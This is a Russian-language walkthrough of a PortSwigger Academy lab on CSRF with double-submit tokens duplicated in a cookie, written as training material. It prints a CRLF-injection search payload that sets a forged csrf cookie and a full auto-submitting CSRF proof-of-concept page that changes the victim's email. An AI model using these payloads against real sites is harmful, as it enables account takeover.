В еще одном варианте предыдущей уязвимости некоторые приложения не ведут никаких записей о выпущенных токенах на стороне сервера, а вместо этого дублируют каждый токен в файле cookie и параметре запроса. Когда последующий запрос проверяется, приложение просто проверяет, что токен, отправленный в параметре запроса, соответствует значению, отправленному в файле cookie. Это иногда называют защитой "double submit" от CSRF, и она поддерживается потому, что она проста в реализации и позволяет избежать необходимости в каком-либо состоянии на стороне сервера:
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
...
csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```
В этой ситуации злоумышленник может снова выполнить атаку CSRF, если веб-сайт содержит какие-либо функции настройки файлов cookie. Здесь злоумышленнику не нужно получать собственный действительный токен. Они просто изобретают токен (возможно, в требуемом формате, если это проверяется), используют поведение настройки файлов cookie, чтобы поместить свой файл cookie в браузер жертвы, и передают свой токен жертве в своей CSRF-атаке.

Логинимся под `wiener:peter`
включим режим `proxy` -> `intercept is on `

и попробуем сменить почтовый ящик на `change@me.com`

и отправим данный запрос в `Repeater`, а сам запрос в проксе дропнем
```
POST /my-account/change-email HTTP/2
Cookie: csrf=hqzhbK41G3LY9zAvQ8k14Q74Nv2rGDci; session=v49QBbBAaKSTGGWYh7gLOYGEDqvBq08S
...
email=change%40me.com&csrf=hqzhbK41G3LY9zAvQ8k14Q74Nv2rGDci
```
И видим, что `csrf` токен дублируется в как в куки, так и в параметрах запроса

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/6.%20CSRF%20where%20token%20is%20duplicated%20in%20cookie/pics%20for%20walkthrough/1.png)

Изменим и там и там параметр `csrf` в обоих параметрах, допустим на `test`

и увидим, что почтовый ящик изменен, что означает, что сервер не ведет учет csrf токенов актуален он или нет, главное - чтобы они были одинаковы

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/6.%20CSRF%20where%20token%20is%20duplicated%20in%20cookie/pics%20for%20walkthrough/2.png)

Вернемся на страницу с блогамии, и выполним поиск по слову `soup`
```
GET /?search=soup 
```
Увидим, что в ответе в куках появился параметр `Set-Cookie: LastSearchTerm=soup;`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/6.%20CSRF%20where%20token%20is%20duplicated%20in%20cookie/pics%20for%20walkthrough/3.png)

Изменим запрос, установив нужную нам куку - `test`
```
GET /?search=soup%0d%0aSet-Cookie:%20csrf=test
```

где `%0d%0a` - символы переноса строки

и увидим, что в ответе мы успешно поменяли отдаваемое `csrf cookie`
```
csrf=test
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/6.%20CSRF%20where%20token%20is%20duplicated%20in%20cookie/pics%20for%20walkthrough/4.png)
Далее вернемся в proxy -> HTTP history и найдем запрос на смену почтового ящика и нажмем `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC`
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1d001904efeb2581449d7a001b00c7.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change&#64;me&#46;com" />
      <input type="hidden" name="csrf" value="hqzhbK41G3LY9zAvQ8k14Q74Nv2rGDci" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/6.%20CSRF%20where%20token%20is%20duplicated%20in%20cookie/pics%20for%20walkthrough/5.png)

Далее изменим несколько этот PoC изменив csrf токен в строке `<input type="hidden" name="csrf" value="mysupercsrftoken" />` и в пэйлоаде уберем содержимое` <script>` заменив его на 
```
<img src="https://0a1d001904efeb2581449d7a001b00c7.web-security-academy.net/?search=soup%0d%0aSet-Cookie:%20csrf=mysupercsrftoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

В итоге получим следующий PoC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1d001904efeb2581449d7a001b00c7.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change5&#64;me&#46;com" />
      <input type="hidden" name="csrf" value="mysupercsrftoken" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a1d001904efeb2581449d7a001b00c7.web-security-academy.net/?search=soup%0d%0aSet-Cookie:%20csrf=mysupercsrftoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

Перейдем в `Exploit server`, нажмем `Store` и `Deliver exploit to victim` и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/6.%20CSRF%20where%20token%20is%20duplicated%20in%20cookie/pics%20for%20walkthrough/6.png)
